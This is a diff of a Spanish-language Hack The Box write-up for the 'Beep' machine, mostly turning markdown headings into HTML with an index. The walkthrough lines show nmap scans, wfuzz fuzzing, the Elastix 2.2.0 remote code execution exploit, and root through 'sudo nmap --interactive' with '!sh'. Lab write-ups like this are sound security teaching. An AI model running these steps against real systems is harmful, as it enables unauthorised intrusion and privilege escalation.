@@ -20,10 +20,53 @@ tags:
   - OSCP Style
 ---
 ![](/assets/images/htb-writeup-beep/beep_logo.png)
+
 Esta máquina es fácil, hay bastantes maneras de poder vulnerarla, lo que haremos será usar un Exploit que nos conecte de manera remota a la máquina, sera configurado y modificado para que sea aceptado pues la página web que esta activa en el puerto 80 tiene ya expirado su certificado SSL. Una vez dentro usaremos los permisos que tenemos para convertirnos en Root usando la herramienta nmap tal y como lo menciona el Exploit.
 
-# Recopilación de Información
-## Traza ICMP
+
+<br>
+<hr>
+<div id="Indice">
+	<h1>Índice</h1>
+	<ul>
+		<li><a href="#Recopilacion">Recopilación de Información</a></li>
+			<ul>
+				<li><a href="#Ping">Traza ICMP</a></li>
+				<li><a href="#Puertos">Escaneo de Puertos</a></li>
+				<li><a href="#Servicios">Escaneo de Servicios</a></li>
+			</ul>
+		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
+			<ul>
+				<li><a href="#Investigacion">Investigación de Servicios</a></li>
+				<li><a href="#Fuzz">Fuzzing</a></li>
+			</ul>
+		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
+			<ul>
+				<li><a href="#Exploit">Buscando y Probando un Exploit</a></li>
+				<ul>
+                                        <li><a href="#PruebaExp">Probando el Exploit: Elastix 2.2.0 - Remote Code Execution</a></li>
+                                </ul>
+			</ul>
+		<li><a href="#Post">Post Explotación</a></li>
+		<li><a href="#Links">Links de Investigación</a></li>
+	</ul>
+</div>
+
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+ <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
+  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
+   <a href="#Indice">Volver al Índice</a>
+  </button>
+</div>
+<br>
+
+
+<h2 id="Ping">Traza ICMP</h2>
+
 Vamos a realizar un ping para saber si la máquina está conectada y vamos a analizar el TTL para saber que SO tiene dicha máquina.
 ```
 ping -c 4 10.10.10.7 
@@ -39,7 +82,8 @@ rtt min/avg/max/mdev = 135.993/137.635/139.741/1.376 ms
 ```
 Estamos contra una máquina con Linux, interesante. Ahora vamos a realizar los escaneos.
 
-## Escaneo de Puertos
+<h2 id="Puertos">Escaneo de Puertos</h2>
+
 ```
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.7 -oG allPorts            
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
@@ -93,7 +137,8 @@ Nmap done: 1 IP address (1 host up) scanned in 38.05 seconds
 
 Ufff muchos puertos abiertos, tenemos bastantillo que investigar, aunque ya vi unos servicios conocidos como el **SSH**, el **RPCBIND** y el puerto HTTP, veamos que show con los demás servicios.
 
-## Escaneo de Servicios
+<h2 id="Servicios">Escaneo de Servicios</h2>
+
 ```
 nmap -sC -sV -p22,25,80,110,111,143,443,878,993,995,3306,5038 10.10.10.7 -oN targeted
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-15 20:55 CST
@@ -153,8 +198,21 @@ Nmap done: 1 IP address (1 host up) scanned in 245.95 seconds
 
 Ok, para empezar, no tenemos ninguna credencial para el servicio SSH por lo que es el primero que descartamos, podríamos iniciar viendo que es ese servicio de **Postfix smtpd** y después la página web del puerto HTTP. De ahí en adelante también podríamos investigar el servicio **Cyrus pop3d**. Bueno empecemos a investigar pues.
 
-# Análisis de Vulnerabilidades
-## Investigación de Servicios
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+ <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
+  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
+   <a href="#Indice">Volver al Índice</a>
+  </button>
+</div>
+<br>
+
+
+<h2 id="Investigacion">Investigación de Servicios</h2>
+
 Vamos a iniciar con el **Postfix smtpd**:
 
 **Postfix es un agente de transporte de mensajes (MTA) de última generación, también conocido como servidor SMTP, que tiene dos propósitos: Es responsable de transportar mensajes de correo electrónico desde un cliente de correo o  agente de usuario de correo (MUA) a un servidor SMTP remoto.**
@@ -190,7 +248,10 @@ Usan PHP, entonces podemos hacer un **Fuzzing** para ver que otras subpáginas h
 * eLaStIx.
 * 2oo7
 
-No sirvieron, bueno hagamos el **Fuzzing**:
+No sirvieron, bueno hagamos el **Fuzzing**.
+
+<h2 id="Fuzz">Fuzzing</h2>
+
 ```
 wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.7/FUZZ.php/
  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
@@ -228,8 +289,21 @@ Wow, wow, wow, salieron demasiados códigos de estado 302, este código quiere d
 
 Entonces no creo que podamos hacer mucho, busquemos directamente un Exploit para este servicio.
 
-# Explotación de Vulnerabilidades
-## Buscando y Probando un Exploit
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+ <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
+  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
+   <a href="#Indice">Volver al Índice</a>
+  </button>
+</div>
+<br>
+
+
+<h2 id="Exploit">Buscando y Probando un Exploit</h2>
+
 ```
 searchsploit elastix      
 ----------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -248,7 +322,8 @@ Papers: No Results
 ```
 Hay varios que me gustaría probar como el LFI, XSS y PHP Code Injection, pero creo que sería mejor si probamos con el RCE. Vamos a analizar y después los demás.
 
-### Probando el Exploit: Elastix 2.2.0 - Remote Code Execution
+<h2 id="PruebaExp">Probando el Exploit: Elastix 2.2.0 - Remote Code Execution</h2>
+
 ```
 searchsploit -x php/webapps/18650.py     
   Exploit: FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution
@@ -299,7 +374,18 @@ id
 uid=100(asterisk) gid=101(asterisk)
 ```
 
-# Post Explotación
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+ <h1 id="Post" style="text-align:center;">Post Explotación</h1>
+  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
+   <a href="#Indice">Volver al Índice</a>
+  </button>
+</div>
+<br>
+
+
 Bueno, ¿y ahora qué? El mismo Exploit nos indica que hacer y es activar el nmap con SUDO de forma interactiva, para poder usar nmap desde la consola y no como comando, solamente escribimos **!sh** y podremos escalar privilegios para ser Root:
 ```
 sudo nmap --interactive
@@ -362,7 +448,16 @@ root
 ```
 Por lo que leí en **GTFOBins**, se puede escalar usando chown, yum y service. ¡Intentalo!
 
-## Links de Investigación
+
+<br>
+<br>
+<div style="position: relative;">
+ <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
+  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
+   <a href="#Indice">Volver al Índice</a>
+  </button>
+</div>
+
 * https://stackoverflow.com/questions/63111167/ssl-error-unsupported-version-when-attempting-to-debug-with-iis-express
 * https://www.exploit-db.com/exploits/18650
 * https://www.offsec.com/vulndev/freepbx-exploit-phone-home/
@@ -370,4 +465,6 @@ Por lo que leí en **GTFOBins**, se puede escalar usando chown, yum y service. �
 * https://github.com/infosecjunky/FreePBX-2.10.0---Elastix-2.2.0---Remote-Code-Execution
 * https://gtfobins.github.io/
 
+
+<br>
 # FIN
